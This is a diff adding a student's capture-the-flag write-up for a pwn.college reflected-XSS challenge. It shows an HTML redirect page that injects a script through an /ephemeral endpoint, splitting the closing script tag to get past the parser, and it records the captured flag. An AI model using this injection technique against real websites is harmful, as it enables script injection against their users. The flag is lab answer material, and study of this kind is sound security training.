@@ -8,11 +8,28 @@
 ## ✅ what i did  
 -clicked start
 -opened the terminal
--ran: 
-
+-ran: 'cat /challenge/server'
+-ran: '/challenge/server'
+the challenge works lowkey the same as previous one but the goal is to perform a XSS also
+there is a new endpoint: /ephemeral -> GET, vulnerable to reflected-XSS
+-opened a new terminal
+-ran: 'vim index.html'
+-typed: '<!DOCTYPE html>'
+        '<html>'
+                '<body>'
+                        '<script>window.location="http://challenge.localhost:80/ephemeral?msg=<script>alert('PWNED')</s"+"cript>";</script>'
+                '</body>'
+        '</html>'
+-ran: 'chmod a+x index.html'
+-ran: 'python3 -m http.server 1337'
+-opened a new terminal
+-ran: '/challenge/victim'
+-checked logs
+-flag popped out
 
 ## 🧑🏾‍🏫 what this challenge teaches u
-
+crucial to understand how to avoid </script> parsing 
+just divide </script> in the middle and concatenate the two parts
 
 ## 🏁 Flag  
 pwn.college{Q041-uHK5rhAcqDb31V5bUyZWSf.QXzgTN2wCO4IDOxEzW}
